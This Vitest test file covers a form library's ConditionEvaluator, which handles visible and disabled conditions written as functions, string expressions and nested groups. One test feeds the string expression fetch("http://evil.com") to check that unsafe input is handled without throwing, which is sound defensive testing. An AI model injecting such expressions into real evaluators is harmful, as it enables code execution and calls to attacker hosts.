import { describe, it, expect } from 'vitest'
import { ConditionEvaluator, evaluateFieldConditions } from '../core/ConditionEvaluator'
import type { FieldDefinition } from '../core/types'

const evaluator = new ConditionEvaluator()

describe('ConditionEvaluator.evaluateFields', () => {
  it('keeps visible=true by default', () => {
    const fields: FieldDefinition[] = [{ type: 'text', name: 'name' }]
    const result = evaluator.evaluateFields(fields, {})
    expect(result[0].visible).toBe(true)
  })

  it('respects static visible=false', () => {
    const fields: FieldDefinition[] = [{ type: 'text', name: 'name', visible: false }]
    const result = evaluator.evaluateFields(fields, {})
    expect(result[0].visible).toBe(false)
  })

  it('evaluates function visible', () => {
    const fields: FieldDefinition[] = [{
      type: 'text',
      name: 'extra',
      visible: (values) => values['showExtra'] === true,
    }]
    expect(evaluator.evaluateFields(fields, { showExtra: false })[0].visible).toBe(false)
    expect(evaluator.evaluateFields(fields, { showExtra: true })[0].visible).toBe(true)
  })

  it('evaluates string expression visible', () => {
    const fields: FieldDefinition[] = [{
      type: 'text',
      name: 'adult',
      visible: 'values.age >= 18',
    }]
    expect(evaluator.evaluateFields(fields, { age: 16 })[0].visible).toBe(false)
    expect(evaluator.evaluateFields(fields, { age: 18 })[0].visible).toBe(true)
  })

  it('blocks unsafe string expression', () => {
    const fields: FieldDefinition[] = [{
      type: 'text',
      name: 'bad',
      visible: 'fetch("http://evil.com")',
    }]
    // Should fall back to true (safe default) or false — key thing is no throw
    expect(() => evaluator.evaluateFields(fields, {})).not.toThrow()
  })

  it('evaluates function disabled', () => {
    const fields: FieldDefinition[] = [{
      type: 'text',
      name: 'field',
      disabled: (values) => values['locked'] === true,
    }]
    expect(evaluator.evaluateFields(fields, { locked: true })[0].disabled).toBe(true)
    expect(evaluator.evaluateFields(fields, { locked: false })[0].disabled).toBe(false)
  })

  it('recursively evaluates nested fields', () => {
    const fields: FieldDefinition[] = [{
      type: 'group',
      name: 'group',
      fields: [{ type: 'text', name: 'child', visible: false }],
    }]
    const result = evaluator.evaluateFields(fields, {})
    expect(result[0].fields?.[0].visible).toBe(false)
  })
})

describe('evaluateFieldConditions (standalone)', () => {
  it('works without Vue context', () => {
    const fields: FieldDefinition[] = [{ type: 'text', name: 'x', visible: false }]
    const result = evaluateFieldConditions(fields, {})
    expect(result[0].visible).toBe(false)
  })
})
